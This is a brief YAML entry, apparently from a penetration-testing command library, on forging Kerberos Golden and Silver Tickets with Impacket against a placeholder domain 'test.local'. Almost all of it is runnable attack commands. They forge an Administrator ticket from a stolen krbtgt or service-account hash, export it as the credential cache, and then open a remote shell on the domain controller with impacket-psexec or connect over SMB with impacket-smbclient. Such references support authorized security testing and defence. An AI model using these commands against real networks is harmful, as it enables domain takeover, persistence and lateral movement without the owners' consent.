---
description: |
  Forge Kerberos tickets — Golden Tickets (TGT) and Silver Tickets (TGS)
  using Impacket's ticketer.

  Reference values:
    Domain: test.local
    Domain SID: S-1-5-21-1234567890-1234567890-1234567890
command: |
  # Golden Ticket (need krbtgt hash)
  impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain test.local Administrator
  export KRB5CCNAME=Administrator.ccache
  impacket-psexec test.local/Administrator@dc.test.local -k -no-pass

  # Silver Ticket (need service account hash)
  impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain test.local -spn cifs/dc.test.local Administrator
  export KRB5CCNAME=Administrator.ccache
  impacket-smbclient test.local/Administrator@dc.test.local -k -no-pass
phase:
  - Persistence
  - Lateral_Movement
target_os:
  - Windows
services:
  - Kerberos
items:
  - Hash
techniques:
  - Ticket_Forgery
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
